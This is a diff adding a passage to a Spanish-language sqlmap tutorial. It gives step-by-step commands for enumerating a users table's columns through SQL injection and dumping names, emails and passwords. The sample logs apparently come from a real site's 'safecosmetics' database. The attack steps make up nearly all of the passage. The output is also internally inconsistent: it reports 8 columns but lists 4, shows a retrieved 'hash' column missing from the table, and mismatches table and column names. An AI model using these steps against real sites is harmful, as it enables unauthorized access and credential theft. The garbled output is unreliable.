@@ -453,6 +453,62 @@ Al terminar tenemos las siguientes tablas:
 
 `usuarios, otra_tabla, hola_soy_otra_tabla`
 
+Lo siguiente es seleccionar una tabla y extraer las columnas dentro de ella:
+
+`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios --columns`
+
+Al terminar tenemos algo como esto:
+
+```
+[12:17:39] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[12:17:39] [INFO] fetching columns for table 'users' in database 'safecosmetics'
+[12:17:41] [INFO] heuristics detected web page charset 'ascii'
+[12:17:41] [INFO] the SQL query used returns 4 entries
+[12:17:42] [INFO] retrieved: id
+[12:17:43] [INFO] retrieved: int(11)                                                                                         
+[12:17:45] [INFO] retrieved: name                                                                                            
+[12:17:46] [INFO] retrieved: text                                                                                            
+[12:17:47] [INFO] retrieved: passwd                                                                                        
+[12:17:48] [INFO] retrieved: text                                                                                            
+
+.......
+
+[12:17:59] [INFO] retrieved: hash
+[12:18:01] [INFO] retrieved: varchar(128)
+Database: safecosmetics
+Table: users
+[8 columns]
++-------------------+--------------+
+| Column            | Type         |
++-------------------+--------------+
+| email             | text         |
+| id                | int(11)      |
+| name              | text         |
+| passwd            | text         |
++-------------------+--------------+
+```
+
+Tenemos las siguientes columnas:
+
+`id, name, email, passwd`
+
+Por último tenemos que extraer el contenido de esas columnas:
+
+`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios -C id,name,email,passwd --dump `
+
+Al terminar tenemos algo como esto:
+
+```
++----+----------+---------------------+-------------------+
+| id | name     | email               |      password     |
++----+----------+---------------------+-------------------+
+| 0  | pepito   | pepito@correo.com   | contraseñasegura  |
++----+----------+---------------------+-------------------+
+
+```
 
 
 
